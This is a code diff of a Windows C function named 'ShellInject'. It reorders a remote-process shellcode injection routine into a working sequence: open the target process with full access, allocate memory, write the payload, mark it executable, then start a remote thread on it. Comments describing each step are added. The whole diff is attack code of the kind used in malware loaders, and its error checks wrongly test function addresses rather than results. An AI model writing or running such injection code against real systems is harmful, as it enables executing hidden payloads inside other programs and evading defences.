@@ -8,10 +8,13 @@ BOOL ShellInject
 
 {
 
-	HANDLE hProcess = NULL, hThread = NULL;
-	PVOID rBuffer = NULL;
-	DWORD PID = NULL, dwOldProt = NULL, TID = NULL;
-	BOOL State = TRUE;
+	HANDLE	hProcess	= NULL, 
+			hThread		= NULL;
+	PVOID	rBuffer		= NULL;
+	DWORD	PID			= 0, 
+			dwOldProt	= 0, 
+			TID			= 0;
+	BOOL	State		= TRUE;
 
 
 	STARTUPINFO info = { sizeof(info) };
@@ -31,7 +34,7 @@ BOOL ShellInject
 
 	INFO("Current Process ID: %lu", PID);
 
-
+	// Grab Process Handle
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 	if (OpenProcess == NULL)
 	{
@@ -40,7 +43,7 @@ BOOL ShellInject
 	}
 	INFO("Opening a Handle to our Desired PID of: %lu...", PID);
 
-
+	// Allocate memory (shellcode) to target process
 	rBuffer = VirtualAllocEx(hProcess, NULL, sShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (VirtualAllocEx == NULL)
 	{
@@ -49,16 +52,16 @@ BOOL ShellInject
 	}
 	INFO("Allocated %zu Bytes to Process' Virtual Address Space", sShellSize);
 
-
-	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
-	if (CreateRemoteThreadEx == NULL)
+	// write memory (shellcode) to our target process
+	WriteProcessMemory(hProcess, rBuffer, pShellcode, sShellSize, NULL);
+	if (WriteProcessMemory == NULL)
 	{
-		WARN("CreateRemoteThreadEx Failed! With an Error: %lu", GetLastError());
+		WARN("WriteProcessMemory Failed! With an Error: %lu", GetLastError());
 		State = FALSE; goto CLEANUP;
 	}
-	INFO("Successfully Create a Thread Inside our Target Process");
+	INFO("Successfully Wrote %zu Bytes to Process' Memory!", sShellSize);
 
-
+	// change protection permissions
 	VirtualProtectEx(hProcess, rBuffer, sShellSize, PAGE_EXECUTE_READ, &dwOldProt);
 	if (VirtualProtectEx == NULL)
 	{
@@ -67,14 +70,14 @@ BOOL ShellInject
 	}
 	INFO("Changed Allocating Protection from [RW] ----> [RX]");
 
-
-	WriteProcessMemory(hProcess, rBuffer, pShellcode, sShellSize, NULL);
-	if (WriteProcessMemory == NULL)
+	// create a new thread pointing to our payload (shellcode)
+	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
+	if (CreateRemoteThreadEx == NULL)
 	{
-		WARN("WriteProcessMemory Failed! With an Error: %lu", GetLastError());
+		WARN("CreateRemoteThreadEx Failed! With an Error: %lu", GetLastError());
 		State = FALSE; goto CLEANUP;
 	}
-	INFO("Successfully Wrote %zu Bytes to Process' Memory!", sShellSize);
+	INFO("Successfully Create a Thread Inside our Target Process");
 
 
 	OKAY("Waiting!!!");
